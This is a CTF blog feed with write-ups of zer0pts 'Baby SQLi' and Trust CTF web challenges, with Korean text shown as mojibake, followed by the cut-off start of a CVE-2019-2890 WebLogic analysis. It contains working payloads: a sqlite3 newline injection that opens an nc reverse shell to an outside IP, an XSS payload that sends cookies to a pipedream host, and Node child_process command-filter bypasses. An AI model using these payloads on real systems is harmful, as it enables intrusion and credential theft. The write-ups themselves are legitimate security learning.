        <content type="html"><![CDATA[<h2 id="Web-Baby-SQLi-170-pts"><a href="#Web-Baby-SQLi-170-pts" class="headerlink" title=" (Web) Baby SQLi [170 pts]"></a><span style="color:#21C587"></span> (Web) Baby SQLi [170 pts]</h2><blockquote><p>Baby SQLi challenge is bypass of waf and using shell command.</p></blockquote><p>First, You can using <code>.system/.shell/.sh</code> command and execute shell command in SQLite3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SQLite3 CLI</span><br><span class="line">sqlite&gt; .sh id|nc 141.164.52.207 2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Terminal</span><br><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>As above, you can see in sqlite3 executes a shell command using the <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlite3_query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    p = subprocess.Popen([<span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;database.db&#x27;</span>],</span><br><span class="line">                         stdin=subprocess.PIPE,</span><br><span class="line">                         stdout=subprocess.PIPE,</span><br><span class="line">                         stderr=subprocess.PIPE)</span><br><span class="line">    o, e = p.communicate(sql.encode())</span><br><span class="line">    <span class="keyword">if</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(e)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> o.decode().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="string">&#x27;&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        result.append(<span class="built_in">tuple</span>(row.split(<span class="string">&#x27;|&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Looking at the source code, you can line jump using the <code>\n</code> character because using the <code>communicate()</code> in <code>subporcess.Popen()</code> in <code>sqlite3_query()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;post&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>():</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Too long username or password&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    password_hash = hashlib.sha256(password.encode()).hexdigest()</span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = sqlite3_query(</span><br><span class="line">            <span class="string">&#x27;SELECT * FROM users WHERE username=&quot;&#123;&#125;&quot; AND password=&quot;&#123;&#125;&quot;;&#x27;</span></span><br><span class="line">            .<span class="built_in">format</span>(sqlite3_escape(username), password_hash)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        flask.session[<span class="string">&#x27;name&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Invalid Credential&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br></pre></td></tr></table></figure><p>And looking at the source code in login logic, you can see that <code>username</code>/<code>password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code>username</code> value is escaped. but, you donâ€™t worry because treats escape characters as simple string is sqlite3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot; or 1&#x3D;1 -- &quot; and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>In other words, It doensnâ€™t matter if it escaped as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot;;</span><br><span class="line">.sh id|nc 141.164.52.207 2;</span><br><span class="line">and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>So, you can use shell command by doing line jumps as above and using the .sh command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh id|nc 2376348879 2\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>If you write the exploit code as above, close <code>SELECT</code> statemnt and in the line immediately underneath execute <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh nc 2376348879 2 -e sh\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lvnp 2</span><br><span class="line">Listening on 0.0.0.0 2</span><br><span class="line">Connection received on 165.227.180.221 38761</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">cat templates&#x2F;index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Welcome, &#123;&#123;name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">        &#123;% if name &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">        &lt;p&gt;zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;p&gt;No flag for you :(&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Final, I pass the shell using <code>e</code> option about <code>nc</code> and read <code>index.html</code> and saw the flag.</p><blockquote><p>FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trust CTF 2021 Write Up</title>
      <link href="2021/02/28/2021-02-27-Trust-CTF-2021/"/>
      <url>2021/02/28/2021-02-27-Trust-CTF-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true"></p><p>ì˜¤ëŠ˜ì€ ë””ë¯¸ê³ ì˜ Trustë¼ëŠ” íŒ€ì—ì„œ CTFë¥¼ ì£¼ìµœí•´ì„œ ì°¸ì—¬ë¥¼ í–ˆì—ˆìŠµë‹ˆë‹¤. ê°œì¸ì ì¸ ì¼ë„ ìˆê³  í•´ì„œ ì•„ì¹¨ë¶€í„° ì°¸ì—¬í•˜ì§€ ëª» í•˜ê³ , ì˜¤í›„ì— ì¡°ê¸ˆ ì°¸ì—¬ë¥¼ í–ˆìŠµë‹ˆë‹¤.</p><hr><h2 id="Web-babyxss-270-pts"><a href="#Web-babyxss-270-pts" class="headerlink" title=" (Web) babyxss [270 pts]"></a><span style="color:#21C587"></span> (Web) babyxss [270 pts]</h2><blockquote><p>babyxss ë¬¸ì œëŠ” DOMPurify Bypassë¡œ ìœ„ì¥í•œ ê°„ë‹¨í•œ XSS ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="comment"># This Challenge using newest version DomPurify..! Maybe unexploitable!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-security-policy: base-uri &#x27;self&#x27;; block-all-mixed-content; connect-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="line">    header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1 id=&#x27;name&#x27;&gt;Hello &lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;integrity=&quot;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;https://cure53.de/purify.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;var name=&#x27;&quot;</span>. base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) .<span class="string">&quot;&#x27;;document.getElementById(&#x27;name&#x27;).innerHTML += DOMPurify.sanitize($(&#x27;&lt;p&gt;&#x27;).html(atob(name)).text())&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ ìœ„ì™€ ê°™ì€ ì½”ë“œê°€ ë‚˜ì˜¤ëŠ”ë° ë³´ë©´ CSPë„ ê±¸ë ¤ ìˆê³ , ë°‘ì—ëŠ” DOMPurifyë¥¼ ì´ìš©í•´ì„œ XSSë¥¼ ëŒ€ì‘í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ê·¸ëƒ¥ DOMPurify Bypass Payloadë¥¼ ì•„ë¬´ ê±°ë‚˜ ì‚½ì…í•´ì„œ íŠ¸ë¦¬ê±°ê°€ ë˜ê¸¸ë˜ ì¿ í‚¤ë¥¼ íƒˆì·¨í•´ì„œ í”Œë˜ê·¸ë¥¼ ì–»ì—ˆìŠµë‹ˆë‹¤.<br></p><p>í•˜ì§€ë§Œ íŠ¸ë¦¬ê±°ê°€ ëœ ì´ìœ ëŠ” DOMPurifyë¥¼ ìš°íšŒí•´ì„œê°€ ì•„ë‹™ë‹ˆë‹¤. DOMPurifyëŠ” ìµœì‹  ë²„ì „ì„ ì‚¬ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ìš°íšŒí•˜ëŠ” ê±´ ë¶ˆê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;&lt;p&gt;&#x27;</span>).html(atob(name)).text()</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ ìœ„ ì½”ë“œë¥¼ <code>sanitize()</code> ë©”ì„œë“œì˜ ì¸ìë¡œ ë„˜ê²¨ì£¼ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ ì €ê¸°ì„œ DOM ë‚´ë¶€ì— ì ì‹œ ë“¤ì–´ê°€ê²Œ ë˜ëŠ”ë° ì €ë•Œ XSSê°€ íŠ¸ë¦¬ê±°ê°€ ë˜ëŠ” ê²ƒ ì…ë‹ˆë‹¤. ê·¸ë˜ì„œ ì¼ë°˜ì ì¸ í˜ì´ë¡œë“œë¥¼ ì´ìš©í•´ì„œë„ XSSíŠ¸ë¦¬ê±°ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss.trustctf.xyz&#x2F;?name&#x3D;%3Csvg%3E%3C&#x2F;p%3E%3Cstyle%3E%3Ca%20id&#x3D;%22%3C&#x2F;style%3E%3Cimg%20src&#x3D;1%20onerror&#x3D;location.href&#x3D;%27https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;?f&#x3D;%27.concat(document.cookie)%3E%22%3E</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}</p></blockquote><hr><h2 id="Web-FLAG-Checker-1000-pts"><a href="#Web-FLAG-Checker-1000-pts" class="headerlink" title=" (Web) FLAG Checker [1000 pts]"></a><span style="color:#21C587"></span> (Web) FLAG Checker [1000 pts]</h2><blockquote><p>FLAG Checker ë¬¸ì œëŠ” ê°„ë‹¨í•œ ReDos ë¬¸ì œì…ë‹ˆë‹¤. ì´ë¡ ë§Œ ì €ë²ˆì— ê³µë¶€í•˜ê³  ì²˜ìŒ í•´ë³´ëŠ”ë° ê·¸ëƒ¥ ì‹ ê¸°í•œ ê¸°ë²•ì¸ ê±° ê°™ìŠµë‹ˆë‹¤. </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Wrong.... <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./secret.php&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = preg_match(<span class="string">&quot;/<span class="subst">&#123;$_GET[&#x27;flag&#x27;]&#125;</span>/&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] &amp;&amp; <span class="variable">$result</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong....&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ ìœ„ì™€ ê°™ì´ ë‚˜ì˜¤ëŠ”ë° ì–¼ë§ˆì „ì— ì´ëŸ° ë¬¸ì œë¥¼ ë³¸ì ì´ ìˆì–´ì„œ ë°”ë¡œ ReDosê°€ ìƒê°ì´ ë‚¬ê³ , í•´ë‹¹ ê¸°ë²•ìœ¼ë¡œ ìŠ¥ì‚­ í•´ì£¼ë‹ˆ í”Œë˜ê·¸ê°€ ë‚˜ì™”ìŠµë‹ˆë‹¤. í•´ë‹¹ ë¬¸ì œì™€ ë¹„ìŠ·í•œ ë¬¸ì œê°€ ë‚˜ì¤‘ì— webhacking.krì—ë„ ì˜¬ë¼ì˜¨ë‹¤ê³  í•´ì„œ ë”°ë¡œ ìµìŠ¤ ì½”ë“œëŠ” ì˜¬ë¦¬ì§€ ì•Šê² ìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}</p></blockquote><hr><h2 id="Web-nodejail-Not-Solve-400-pts"><a href="#Web-nodejail-Not-Solve-400-pts" class="headerlink" title=" (Web) nodejail (Not Solve) [400 pts]"></a><span style="color:#21C587"></span> (Web) nodejail (Not Solve) [400 pts]</h2><blockquote><p>nodejail ë¬¸ì œëŠ” ê°„ë‹¨í•œ ì œì¼ë¬¸ì œ ì…ë‹ˆë‹¤.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true"></p><p>ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ ê·¸ëƒ¥ ì…ë ¥ì°½ í•˜ë‚˜ê°€ ë³´ì…ë‹ˆë‹¤. Javasript ì½”ë“œë¥¼ ì…ë ¥í•´ì£¼ë©´ ì—¬ëŸ¬ê°€ì§€ ë¬¸ìê°€ í•„í„°ë§ ê±¸ë¦° ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`c?t<span class="subst">$&#123;IFS&#125;</span>~~`</span>).toString()</span><br></pre></td></tr></table></figure><p>ëŒ€íšŒ ë‹¹ì‹œì—ëŠ” ìœ„ì™€ ê°™ì´ ${IFS}ë¥¼ ì´ìš©í•´ì„œ ê³µë°±ì„ ìš°íšŒí•˜ëŠ” ë°©ì‹ì„ ì´ìš©í•´ì„œ ì§„í–‰í•˜ê³  ìˆì—ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ìœ„ì™€ ê°™ì´ ì•„ë¬´ë¦¬ í•´ë´ë„ <code>err</code>ë§Œ ë°˜í™˜í•  ë¶„ ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•Šì•„ ê·¸ëƒ¥ í¬ê¸° í–ˆì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><p>ëŒ€íšŒê°€ ëë‚˜ê³  ìŠ¹ì£¼ë‹˜ì—ê²Œ ë¬¼ì–´ë³´ë‹ˆ <code>fs</code> ëª¨ë“ˆì„ ì´ìš©í•´ì„œ ë””í…í„°ë¦¬ íƒìƒ‰ì„ í•˜ëŠ” ì½”ë“œë¥¼ ë°›ì„ ìˆ˜ ìˆì—ˆë‹¤. ìœ„ ì½”ë“œë¥¼ ë³´ê³  í•œ ì°¸ ì–´ì´ê°€ ì—†ì—ˆë‹¤. <code>fs</code>ë¥¼ ëª¨ë“ˆì„ ì´ìš©í•´ì„œ íŒŒì¼ì„ ì½ê³ , ì“°ê³ ë§Œ ë˜ëŠ” ì¤„ ì•Œì•˜ëŠ”ë° ì•Œê³  ë³´ë‹ˆ ë””ë ‰í„°ë¦¬ë¥¼ íƒìƒ‰í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì²˜ìŒ ì•Œì•˜ê¸° ë•Œë¬¸ì´ë‹¤.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><p>ê·¸ë¦¬ê³  ë‘ ë²ˆì§¸ëŠ” ê²½ì¤€ë‹˜ì€ ì–´ì¼€ í’€ì—ˆë‚˜ ê¶ê¸ˆí•´ì„œ ë¬¼ì–´ë³´ë‹ˆ ìœ„ì™€ ê°™ì´ ìœ„ì™€ ê°™ì´ 16ì§„ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ê³µë°±ì„ ìš°íšŒí•œ ê²ƒì„ ë³´ê³ , ë˜ ì–´ì´ê°€ ì—†ì—ˆë‹¤..</p><blockquote><p>TRUST{th1s_1s_3xtrem3_n0d3_j41l}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> ReDos </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2890 Unserialize RCE in Oracle WebLogic</title>
      <link href="2021/02/10/2021-02-10-CVE-2019-2890/"/>
      <url>2021/02/10/2021-02-10-CVE-2019-2890/</url>
      
        <content type="html"><![CDATA[<p>ì˜ˆì „ë¶€í„° ë¶„ì„ì„ í•˜ê³ , ê¸€ì„ ì‘ì„±í•˜ë ¤ í–ˆì§€ë§Œ ê²Œìœ¼ë¦„ íƒ“ì¸ ì§€ 2020ë…„ì— í• ë ¤ í–ˆë˜ ê±¸ ì§€ê¸ˆ í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë²ˆ ì·¨ì•½ì ì€ ì˜¤ë¼í´ì—ì„œ ì œê³µí•˜ëŠ” Oracle Fusion Middlewareì˜ ì›¹ ë¡œì§ ì„œë²„ì—ì„œ ë°œê²¬ ëœ ì—­ì§ë ¬í™” RCE ì·¨ì•½ì ì…ë‹ˆë‹¤. í•´ë‹¹ ì›¹ ë¡œì§ ì„œë²„ì—ì„œëŠ” ë°ì´í„°ë¥¼ T3 í”„ë¡œí† ì½œì„ ì´ìš©í•´ì„œ ì „ë‹¬í•˜ëŠ”ë°, ì•ˆì „í•˜ê²Œ ì „ë‹¬í•˜ê¸° ìœ„í•´ì„œ <code>Serialize</code> -&gt; <code>encryption</code> -&gt; <code>Decryption</code> -&gt; <code>Unserialize</code>ì™€ ê°™ì€ ê³¼ì •ì„ ê±°ì³ ì „ë‹¬í•œë‹¤ê³  í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ë°ì´í„°ì— ëŒ€í•œ ê²€ì¦ ì ˆì°¨ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•„ ë°ì´í„°ë¥¼ ì—­ì§ë ¬í™” í•  ë•Œ RCE ì·¨ì•½ì ì´ í„°ì§€ê²Œ ë©ë‹ˆë‹¤.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-2890</td><td>WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</td><td>7.2</td></tr></tbody></table><p><br>VE-2019-2890ëŠ” WebLogic Server <code>10.3.6.0.0</code>, <code>12.1.3.0.0</code>, <code>12.2.1.3.0</code>ì—ì„œ ëª¨ë‘ ë°œìƒí–ˆê³ , 2019ë…„ 10ì›” 16ì¼ì— POCê°€ ê³µê°œëê³ , 10ì›”ì— ë°”ë¡œ ê¸´ê¸‰íŒ¨ì¹˜ë¥¼ ë°œí‘œí–ˆë‹¤ê³  í•©ë‹ˆë‹¤.<br></p><hr><h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title=" CVE-2019-2890"></a><span style="color:#21C587"></span> CVE-2019-2890</h2><p>ì·¨ì•½ì ì€ <code>PersistentContext</code> í´ë˜ìŠ¤ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (SubjectManager.getSubjectManager().isKernelIdentity(<span class="keyword">this</span>._subject)) &#123;</span><br><span class="line">        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span><br><span class="line">        getSubjectManager().getAnonymousSubject();</span><br><span class="line">        var3.writeObject(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var3.writeObject(<span class="keyword">this</span>._subject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">        var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    &#125;</span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeSubject</code> ë©”ì„œë“œëŠ” ë°ì´í„°ë¥¼ ì§ë ¬í™” í•˜ê³ , ì•”í˜¸í™”í•˜ëŠ” ë©”ì„œë“œì…ë‹ˆë‹¤. <code>Line 5 ~ 11</code>ì—ì„œ ë°ì´í„°ë¥¼ ì§ë ¬í™”í•˜ê³ , <code>Line 16 ~ 20</code>ê¹Œì§€ê°€ 